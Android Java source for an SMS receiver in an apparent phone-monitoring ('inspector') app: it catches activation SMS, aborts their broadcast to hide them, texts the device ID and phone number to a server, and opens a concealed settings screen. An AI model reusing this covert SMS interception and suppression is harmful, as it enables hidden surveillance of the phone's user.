package com.system;

import java.util.Date;

import com.system.activity.InitActivity;
import com.system.config.ConfigCtrl;
import com.particle.inspector.common.util.sms.AuthSms;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.LangUtil;
import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
import com.system.feature.sms.SmsCtrl;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LicenseType;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * Receiver for activating setting view.
 */
public class SmsReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "ActivationReceiver";
	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	
	@SuppressWarnings("unused")
	@Override
	public void onReceive(Context context, Intent intent) 
	{
		if (!intent.getAction().equals(SMS_RECEIVED)) return;
		
		String smsBody = SmsCtrl.getSmsBody(intent).trim();
		//SysUtils.messageBox(context, "Received SMS: " + smsBody);
			
		if (smsBody.length() > 0) 
		{
			//-------------------------------------------------------------------------------
			// If it is the activation SMS (only include the key), show the setting view
			if (smsBody.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH &&  
				LicenseCtrl.isLicensed(context, smsBody) != LicenseType.NotLicensed) 
			{
				abortBroadcast(); // Finish broadcast, the system will notify this SMS
				//SysUtils.messageBox(context, "Got license: " + LicenseCtrl.enumToStr(LicenseCtrl.isLicensed(context, smsBody)));
				try {
					// If it is the 1st time, send SMS to server for license key validation
					if (ConfigCtrl.getLicenseType(context) == LicenseType.NotLicensed) 
					{
						String deviceID = DeviceProperty.getDeviceId(context);
						String phoneNum = DeviceProperty.getPhoneNumber(context);
						String phoneModel = DeviceProperty.getDeviceModel();
						String androidVer = DeviceProperty.getAndroidVersion();
						LANG lang = DeviceProperty.getPhoneLang();
						AuthSms sms = new AuthSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
						String smsStr = sms.clientSms2Str();
						String srvAddr = context.getResources().getString(R.string.srv_address);
						SysUtils.messageBox(context, "Server Address: " + srvAddr);
						boolean ret = SmsCtrl.sendSms(srvAddr, smsStr);
						return;
					}
					
					// Save the last activated datetime
					ConfigCtrl.setLastActivatedDatetime(context, (new Date()));
					
					// Start dialog
					Intent initIntent = new Intent().setClass(context, InitActivity.class);
					initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
					initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
					context.startActivity(initIntent);
					
					// Remove the activation SMS
					//SmsCtrl.deleteTheLastSMS(context);
				}
				catch (Exception ex) {
					SysUtils.messageBox(context, ex.getMessage());
					Log.e(LOGTAG, ex.getMessage());
				}
			}
			
			//-------------------------------------------------------------------------------
			// If it is a SMS from server for key validation
			if (smsBody.startsWith(AuthSms.SMS_HEADER)) 
			{
				String[] parts = smsBody.split(AuthSms.SMS_SEPARATOR);
				if (parts.length >= 3) {
					abortBroadcast(); // Finish broadcast, the system will notify this SMS
					if (parts[2].equalsIgnoreCase(AuthSms.SMS_SUCCESS)) {
						// Save flag
						LicenseType type = LicenseCtrl.isLicensed(context, parts[1]);
						if (!ConfigCtrl.setLicenseType(context, type)) {
							Log.e(LOGTAG, "Cannot set license type");
							return;
						}
						
						// Save consumed datetime if it is the 1st activation
						if (ConfigCtrl.getConsumedDatetime(context) == null) {
							ConfigCtrl.setConsumedDatetime(context, (new Date()));
						}
						
						// Start dialog
						Intent initIntent = new Intent().setClass(context, InitActivity.class);
						initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
						initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
						context.startActivity(initIntent);
						
						// Remove the activation SMS
						//SmsCtrl.deleteTheLastSMS(context);
						
					} else if (parts[2].equalsIgnoreCase(AuthSms.SMS_FAILURE)) {
						if (parts.length >= 4) {
							SysUtils.messageBox(context, parts[3]);
						} else {
							SysUtils.messageBox(context, context.getResources().getString(R.string.msg_invalid_key));
						}
					}
				}
			}
			
			
		}
		
        
	}

}